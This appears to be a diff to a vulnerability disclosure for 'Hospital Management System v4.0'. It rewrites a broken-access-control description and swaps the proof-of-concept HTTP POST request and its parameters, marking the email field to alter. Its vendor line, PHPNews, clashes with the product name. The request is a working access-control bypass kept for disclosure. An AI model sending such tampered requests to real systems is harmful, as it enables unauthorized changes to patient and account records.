@@ -5,12 +5,12 @@
 ## Vendor: PHPNews
 ## Version: v4.0
 ## Exploit Description:
-## Hospital Management System v4.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attacker doctor to update the email of patient that cannot modify in UI(horizontal privilege escalation).
+## Hospital Management System v4.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attacker doctor to update his email that cannot modify in UI.
 
 ## -----------------------------------------------POC-------------------------------------------------------------------
 ```
-POST /hospital/hms/doctor/edit-patient.php?editid=2(CHANGE HERE) HTTP/1.1
+POST /hospital/hms/edit-profile.php HTTP/1.1
 ...
 
-patname=user1p&patcontact=111112&patemail=user1p%40test.com(CHANGE HERE)&gender=Male&pataddress=bbb&patage=20&medhis=0&submit=
+fname=user1&address=aaaaaa&city=abbb&gender=male&uemail=user2%40test.com(CHANGE HERE)&submit=
 ```
